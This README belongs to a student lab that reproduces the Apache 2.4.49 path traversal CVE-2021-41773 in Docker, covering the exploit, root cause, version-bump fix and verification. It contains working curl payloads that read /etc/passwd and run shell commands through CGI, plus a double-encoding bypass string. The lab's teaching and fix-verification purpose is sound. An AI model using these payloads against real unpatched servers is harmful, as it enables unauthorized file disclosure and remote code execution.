# CVE-2021-41773 — Apache HTTP Server 2.4.49 path traversal → file disclosure → RCE

This folder is the vulnerable-environment part of Lab 1. It contains the
launcher, the exploit, the patch and the verification script for the CVE that
was selected for the second half of the assignment.

| Property | Value |
|---|---|
| CVE | **CVE-2021-41773** |
| Component | Apache HTTP Server 2.4.49 (core, `ap_normalize_path()`) |
| Class | CWE-22 — Improper Limitation of a Pathname to a Restricted Directory (path traversal) |
| Related | CVE-2021-42013 (CVSS 9.8) — the *incomplete fix* shipped in 2.4.50 |
| CVSS 3.1 | 7.5 HIGH — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (9.8 CRITICAL for the RCE / 42013 variant) |
| Affected | 2.4.49 (and 2.4.50 for the 42013 bypass) |
| Fixed in | **2.4.51** |
| Public exploit | Yes; added to the CISA KEV catalogue on 2021-11-03 |
| OWASP Top 10 | A01:2021 Broken Access Control, A05:2021 Security Misconfiguration, A08:2021 Software and Data Integrity Failures |
| Vulhub path | `vulhub/httpd/CVE-2021-41773` |

---

## 1. Why this CVE

* It has a **single root cause in one function**, so the analysis can be
  precise instead of hand-wavy.
* It is reproduced with **one `curl` command**, which makes the
  before/after comparison in the report unambiguous.
* The fix is a **version bump**, so the "did I actually fix it?" question has a
  verifiable answer, and the same configuration is reused on both sides so
  only one variable changes.
* It chains three classic weaknesses — a path-normalisation bug, an
  over-permissive `Require all granted`, and enabled CGI — which makes a good
  discussion of defence in depth.

---

## 2. Files

```
cve/
├── Dockerfile                 # vulnerable: FROM vulhub/httpd:2.4.49  + vulhub's config tweaks
├── docker-compose.yml         # runs it on http://localhost:8080
├── Dockerfile.fixed           # fixed:      FROM httpd:2.4.51        + identical config
├── docker-compose.fixed.yml   # same port, same config
├── exploit.ps1 / exploit.sh   # reproduce (traversal + RCE)
└── verify-fix.ps1 / verify-fix.sh   # assert the attack fails + regression check
```

The two `sed` lines in the Dockerfiles are what make the flaw *exploitable*:

```dockerfile
# enable mod_cgi / mod_cgid  -> the traversal can reach /bin/sh
sed -i "s|#LoadModule cgi_module modules/mod_cgi.so|LoadModule cgi_module modules/mod_cgi.so|g" ...
# relax <Directory /> -> files outside the DocumentRoot are readable
perl -pe 's|<Directory />.*?</Directory>|<Directory />\n    Require all granted\n</Directory>|isg'
```

Without `Require all granted` the escaped path is answered with `403` by the
default `Require all denied`, which is why the advisory says the issue is
exploitable "if files outside of these directories are not protected by the
usual default configuration".

---

## 3. Launch

**One command (recommended, Windows).** Runs the whole experiment — vulnerable
build → exploit → teardown → patched build → verify → teardown — and writes the
transcripts to `cve/evidence/` so the report can quote real output:

```powershell
cd cve
powershell -ExecutionPolicy Bypass -File .\run-all.ps1   # add -KeepRunning to keep it running

> Default Windows PowerShell refuses to run unsigned scripts; the line above bypasses
> that for this one process. `Set-ExecutionPolicy -Scope Process Bypass` does the same.

```

It exits 0 only when the vulnerable build *was* exploited **and** the fixed
build rejected every variant; if the exploit does not reproduce it says so and
exits 1.

Manual equivalent:

```bash
cd cve
docker compose up -d --build          # first build pulls ~55 MB
docker compose ps
curl -s http://127.0.0.1:8080/        # -> It works!
```

> Prefer the original Vulhub directory? `git clone https://github.com/vulhub/vulhub.git`
> then `cd vulhub/httpd/CVE-2021-41773 && docker compose up -d` — the base image
> and the configuration are the same.


### 方案 D：不装 Docker，直接在 GitHub 上跑

仓库里有 `.github/workflows/cve-repro.yml`，**手动触发**即可在 GitHub 的 runner
（自带 Docker）上完成整套复现 —— 不需要你本机装任何东西：

1. push 仓库后打开 **Actions** → 左侧 **CVE reproduction (manual)** → **Run workflow**；
2. 等约 3–5 分钟；
3. 结果出现在两处：
   * 这次运行的 **Summary** 页面（漏洞版与修复版的完整转录）；
   * Artifacts 里的 `cve-evidence.zip`。

这份转录带时间戳、可复跑，比本地手工截图更硬；报告里可以引用运行链接。
（该工作流只手动触发，不会在 push 时自动执行，且 runner 用完即销毁。）

---

## 4. Reproduce

```bash
# Windows
powershell -ExecutionPolicy Bypass -File .\cve\exploit.ps1
# Linux / macOS
./cve/exploit.sh
```

or manually:

```bash
# 1. the alias directory must exist (/icons/ is created by httpd-autoindex.conf)
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8080/icons/

# 2. path traversal: %2e is a URL-encoded '.', --path-as-is stops curl from
#    normalising the request target for us
curl --path-as-is 'http://127.0.0.1:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'

# 3. optional: code execution because mod_cgi is enabled
curl --path-as-is --data 'echo;id' \
  'http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
```

Expected on the vulnerable build:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

`--path-as-is` matters: without it curl collapses `/icons/.%2e/../` on the
client and the request never leaves the document root.

---

## 5. Root cause

### 5.1 The defect

Apache 2.4.49 replaced the old request-URI normalisation with a new function,
`ap_normalize_path()` in `server/request.c`. The new implementation scans the
path once and, while scanning, both

1. **decodes** percent-encoded octets (`%2e` → `.`), and
2. **decides** whether the current segment is a dot-segment (`.` or `..`) that
   must be collapsed.

The two operations are applied in the wrong order: the dot-segment decision is
made on the characters that are still encoded. A segment written as

```
.%2e          # not "..", so it is not recognised as a traversal segment
```

therefore survives normalisation, and is only turned into the real string `..`
by the later decode pass. The normalised path handed to the core mapper still
contains a live `..`.

`ap_core_translate()` then maps that path onto the filesystem through the
`Alias /icons/ ...` directive without re-checking that the result is still
inside the aliased directory. `..` does what `..` always does: it walks out.

So the failure is not "missing input validation" in the naive sense — the
input *is* validated, but the validator and the decoder disagree about what
the string means (**normalisation/decoding order bug**, a classic
canonicalisation error). This is exactly the CWE-22 shape: the check and the
use resolve the same name differently, so a name that passes the check is not
the name that gets opened.

### 5.2 The amplification

Two configuration choices turn a file-read into a full compromise:

| Config | Effect |
|---|---|
| `<Directory /> Require all granted` | The escaped path is *authorised*, so `/etc/passwd`, `/etc/shadow`-adjacent files, application secrets, cloud metadata (169.254.169.254) become readable. |
| `LoadModule cgi_module` | The traversal can reach `/bin/sh` under `/cgi-bin/`, i.e. arbitrary command execution as the `daemon` user → container escape attempts, lateral movement. |

That is why the same code defect is rated 7.5 (disclosure) in one deployment
and 9.8 (RCE) in another: **the impact is configuration-dependent, the defect
is not.**

### 5.3 Why the first patch was not enough

2.4.50 added a filter that rejected the literal sequence `%2e` in the path.
Because the filter ran on the *encoded* form, double encoding slipped through:

```
%%32%65   -- decodes once to %2e, which decodes again to .
```

That bypass is CVE-2021-42013 (CVSS 9.8). 2.4.51 abandoned the blacklist and
rewrote normalisation so that decoding happens first, dot segments are
collapsed on the decoded string, and any path that would climb above the root
is rejected outright. The lesson for the report: **filtering encoded input is
a losing game; canonicalise first, then validate, then use.**

---

## 6. The fix that was applied

`Dockerfile.fixed` changes exactly one line:

```diff
-FROM vulhub/httpd:2.4.49
+FROM httpd:2.4.51
```

Every configuration line stays the same (CGI enabled, `Require all granted`,
autoindex included), so the experiment isolates one variable: the patched
normalisation code. If the attack now fails, it fails *because of the code
fix*, not because a setting was flipped.

```bash
docker compose down                                   # stop the vulnerable build
docker compose -f docker-compose.fixed.yml up -d --build
powershell -ExecutionPolicy Bypass -File .\cve\verify-fix.ps1
```

Expected:

```
[PASS] home page still returns 200
[PASS] traversal rejected with 400/403/404
[PASS] no /etc/passwd content in the body
[PASS] no uid= in the response
[PASS] no leak for /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/hostname
[PASS] no leak for /cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh
[PASS] no leak for /.%2e/.%2e/.%2e/.%2e/etc/passwd
[PASS] no leak for /icons/..%2f..%2f..%2f..%2fetc%2fpasswd
RESULT: fix verified -- all checks passed.
```

The last four checks matter: fixing only the exact string from the advisory
would be a *blacklist* fix, and the 2.4.50 story shows how that ends. The
verification therefore replays the whole family of traversal spellings.

---

## 7. Defence in depth (recommended in addition to the patch)

The version bump is the *actual* fix; these reduce blast radius if a future
normalisation bug appears:

```apache
# 1. never hand the whole filesystem to the server
<Directory />
    AllowOverride none
    Require all denied
</Directory>

# 2. only enable CGI where it is really needed, and drop the privilege
# 3. run the container read-only with a non-root user
# 4. drop capabilities and use a minimal base image
# 5. keep the container network egress-restricted (blocks metadata SSRF)
# 6. add a WAF rule as a stop-gap, not as the fix
```

In `docker-compose.yml` terms:

```yaml
    read_only: true
    user: "1000:1000"
    security_opt: ["no-new-privileges:true"]
    cap_drop: ["ALL"]
```

---

## 8. References

* Apache HTTP Server 2.4 vulnerabilities — <https://httpd.apache.org/security/vulnerabilities_24.html>
* CVE-2021-41773 / CVE-2021-42013 records — <https://www.cve.org/CVERecord?id=CVE-2021-42013>
* CISA KEV catalogue (added 2021-11-03) — <https://www.cisa.gov/known-exploited-vulnerabilities-catalog>
* Vulhub `httpd/CVE-2021-41773` — <https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2021-41773>
* CWE-22 — <https://cwe.mitre.org/data/definitions/22.html>
* OWASP Top 10 2021 A01 — <https://owasp.org/Top10/A01_2021-Broken_Access_Control/>
